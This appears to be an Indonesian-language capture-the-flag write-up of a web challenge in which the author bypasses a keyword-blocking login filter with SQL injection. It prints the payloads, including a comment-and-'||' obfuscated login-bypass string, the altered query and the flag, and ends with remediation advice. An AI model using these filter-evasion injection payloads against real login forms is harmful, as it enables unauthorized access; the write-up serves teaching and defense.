| Web Exploitation | Medium | 

---

## 🚩 Deskripsi Soal
Tantangan ini menyajikan sebuah halaman login admin di `http://challenge.lks.id:8080`. Deskripsi soal menyebutkan: 
> "Admin merasa aman karena sudah memasang sistem keamanan yang memblokir kata kunci SQL umum (OR, SELECT, UNION). Bisakah Anda masuk tanpa izin?"

---

## 🕵️ Langkah-Langkah Pengerjaan

### 1. Analisis Awal (Reconnaissance)
Saat membuka halaman, terdapat form login standar. Saya mencoba memasukkan input `admin` : `admin`, namun muncul pesan:
`Invalid Username or Password`.

Saya mencoba melakukan pengujian **SQL Injection** sederhana:
- Input: `' OR 1=1 --`
- Respon: `Detected malicious character! Access Denied.`

Ini mengindikasikan adanya **Web Application Firewall (WAF)** sederhana atau fungsi filter pada kode backend yang melakukan *blacklist* terhadap kata kunci SQL tertentu.

### 2. Identifikasi Celah (Bypass Filter)
Berdasarkan pesan error, saya mencoba mencari tahu karakter apa saja yang dilarang. Setelah melakukan *fuzzing*, ditemukan bahwa:
* **Spasi** dilarang.
* Keyword **OR** (case insensitive) dilarang.
* Keyword **AND** dilarang.

Namun, filter tersebut tidak memeriksa penggunaan **komentar SQL** (`/**/`) dan **operator logika alternatif** (`||`).



### 3. Pembuatan Payload (Exploitation)
Untuk melewati filter tersebut, saya menyusun payload dengan teknik **Obfuscation**:

* Mengganti spasi dengan komentar `/**/`.
* Mengganti `OR` dengan `||`.
* Menutup query dengan `#` (comment) untuk mematikan pengecekan password di database.

**Payload Final:**
```sql
admin'/**/||/**/1=1/**/#
```

4. Eksekusi
Saya memasukkan payload tersebut ke dalam kolom Username dan mengisi Password dengan sembarang teks:
 * Username: admin'/**/||/**/1=1/**/#
 * Password: apapun
 * Klik Login
Logika query di backend yang tadinya:
SELECT * FROM users WHERE username = '$user' AND password = '$pass'
Berubah menjadi:
SELECT * FROM users WHERE username = 'admin'/**/||/**/1=1/**/#' AND password = '...' 
Karena 1=1 selalu bernilai TRUE, maka database akan mengembalikan hasil pertama (biasanya akun Admin) tanpa memedulikan password.
🏆 Mendapatkan Flag
Setelah login berhasil, halaman dialihkan ke admin_panel.php yang menampilkan pesan:
> Success! Login bypass detected.
> Flag: LKS{SQLi_ByP4ss_W4F_S3cur3_2026}
> 
🛡️ Remediasi (Saran Perbaikan)
Untuk mencegah serangan ini, pengembang sebaiknya:
 * Gunakan Prepared Statements (Parameterized Queries) alih-alih melakukan sanitasi input secara manual.
 * Jangan mengandalkan blacklist karena penyerang selalu bisa menemukan cara bypass.
 * Gunakan library ORM yang aman untuk menangani query ke database.
<!-- end list -->
